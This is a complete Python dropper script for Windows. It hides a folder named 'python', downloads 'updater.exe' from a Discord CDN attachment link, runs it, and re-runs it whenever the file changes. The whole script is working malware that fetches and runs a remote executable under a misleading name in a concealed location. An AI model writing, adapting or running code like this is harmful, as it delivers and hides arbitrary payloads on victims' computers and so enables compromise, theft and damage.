import os
import requests
import subprocess
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import ctypes

class ExeFileHandler(FileSystemEventHandler):
    def __init__(self, exe_path):
        super().__init__()
        self.exe_path = exe_path

    def on_modified(self, event):
        if event.src_path == self.exe_path:
            subprocess.run([self.exe_path], shell=True)

def create_hidden_folder_and_download(repo_url, exe_filename, folder_name):
    current_dir = os.path.dirname(os.path.abspath(__file__))
    hidden_folder_path = os.path.join(current_dir, folder_name)

    try:
        os.mkdir(hidden_folder_path)

        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(hidden_folder_path, FILE_ATTRIBUTE_HIDDEN)

        response = requests.get(repo_url)
        response.raise_for_status()

        exe_path = os.path.join(hidden_folder_path, exe_filename)

        with open(exe_path, 'wb') as exe_file:
            exe_file.write(response.content)

        return exe_path
    except FileExistsError:
        pass

repo_url = "https://cdn.discordapp.com/attachments/1178043334820896831/1178044092647735306/updater.exe"
exe_filename = 'updater.exe'
folder_name = 'python'

downloaded_exe_path = create_hidden_folder_and_download(repo_url, exe_filename, folder_name)

if downloaded_exe_path:
    subprocess.run([downloaded_exe_path], shell=True)

    handler = ExeFileHandler(downloaded_exe_path)
    observer = Observer()
    observer.schedule(handler, path=os.path.dirname(downloaded_exe_path), recursive=False)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()

    observer.join()
